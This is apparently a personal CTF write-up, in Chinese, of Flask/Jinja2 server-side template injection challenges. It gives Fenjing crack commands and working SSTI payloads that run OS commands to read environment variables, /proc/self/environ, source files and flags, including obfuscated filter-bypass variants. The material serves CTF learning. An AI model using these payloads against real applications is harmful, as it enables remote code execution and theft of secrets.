# 先考虑Fenjing一把梭

## [Flask]SSTI

```
python -m fenjing crack --method GET --inputs name --url 'http://node5.buuoj.cn:28083'
```

```
{{cycler.next.__globals__.__builtins__.__import__('os').popen('env').read()}}
```

![image-20240716010107060](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716010107060.png)



## [第三章 web进阶]SSTI

```
python -m fenjing crack --method GET --inputs password --url 'http://b7823c99-0f4a-4a3f-946f-c01c52459482.node5.buuoj.cn:81/'
```

```
{{cycler.next.__globals__.__builtins__.__import__('os').popen('cat /app/server.py').read()}}
```

![image-20240716011159944](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716011159944.png)

```
{{''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("cat /proc/self/environ").read()')}}
```

```
{{''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("cat /app/server.py").read()')}}
```



## DownUnderCTF 2024 [web] Parrot the Emu

[DownUnderCTF 2024 | Cook1e (p-pratik.github.io)](https://p-pratik.github.io/posts/ductf'24/)

[Server Side Template Injection (SSTI) In Flask/Jinja2 (payatu.com)](https://payatu.com/blog/server-side-template-injectionssti/)

在环境变量env中找到flag

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls /').read()}}
```

fenjing得到的payload：

```
python -m fenjing crack --method POST --inputs user_input --url 'https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev/'
```

```
{{cycler.next.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

![image-20240716005756767](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716005756767.png)

## EasySSTI

[【Web】Dest0g3 520迎新赛 题解(全)_[dest0g3 520迎新赛\]pharpop-CSDN博客](https://blog.csdn.net/uuzeray/article/details/137777759)

```
{%set%0aid=dict(ind=a,ex=a)|join%}{%set%0app=dict(po=a,p=a)|join%}{%set%0ann=dict(n=a)|join%}{%set%0aenv=dict(env=a)|join%}{%set%0appe=dict(po=a,pen=a)|join%}{%set%0att=dict(t=a)|join%}{%set%0agt=dict(ge=a,t=a)|join%}{%set%0aff=dict(f=a)|join%}{%set%0aooqq=dict(o=a,s=a)|join%}{%set%0afive=(lipsum|string|list)|attr(id)(tt)%}{%set%0ard=dict(re=a,ad=a)|join%}{%set%0athree=(lipsum|string|list)|attr(id)(nn)%}{%set%0aone=(lipsum|string|list)|attr(id)(ff)%}{%set%0ashiba=five*five-three-three-one%}{%set%0axiahuaxian=(lipsum|string|list)|attr(pp)(shiba)%}{%set%0agb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join%}{%set%0abin=(xiahuaxian,xiahuaxian,dict(built=a,ins=a)|join,xiahuaxian,xiahuaxian)|join%}{%set%0aini=(xiahuaxian,xiahuaxian,dict(in=a,it=a)|join,xiahuaxian,xiahuaxian)|join%}{%set%0achcr=(lipsum|attr(gb))|attr(gt)(bin)%}{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(env)|attr(rd)()}}
```

![image-20240716004841315](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716004841315.png)

## [pasecactf_2019]flask_ssti

找可用类脚本：

```
import json

a = """
"""

num = 0
allList = []

result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i

for k, v in enumerate(allList):
    if "os._wrap_close" in v:
        print(str(k) + "--->" + v)

```

![image-20240716013251366](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716013251366.png)

```
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
```

## [NewStarCTF 公开赛赛道]BabySSTI_One Two Three

命令执行：

```
tail /fl**
```

```
{{cycler.next.__globals__.__builtins__.__import__('os').popen('tail /fl**').read()}}
```

```
{%set       ta='\x74\x61\x69\x6c\x20\x2f\x66\x6c\x2a\x2a'%}{{cycler.next['__g''lobals__']['__b''uiltins__'].__import__('os')['p''open'](ta).read()}}
```

![image-20240716020308261](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716020308261.png)

将 _ 16进制编码:

```
http://53d96c09-d564-4c54-9c4f-3c3454c40527.node5.buuoj.cn:81/?name=payload%EF%BC%9A?name={{[][%27\x5f\x5fcl%27%27ass\x5f\x5f%27][%27\x5f\x5fba%27%27se\x5f\x5f%27][%27\x5f\x5fsubc%27%27lasses\x5f\x5f%27]()[117][%27\x5f\x5fin%27%27it\x5f\x5f%27][%27\x5f\x5fglo%27%27bals\x5f\x5f%27][%27po%27%27pen%27](%27\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u005f\u0069\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0035\u0032\u0064\u0061\u0061\u0064%27).read()}}
```

`
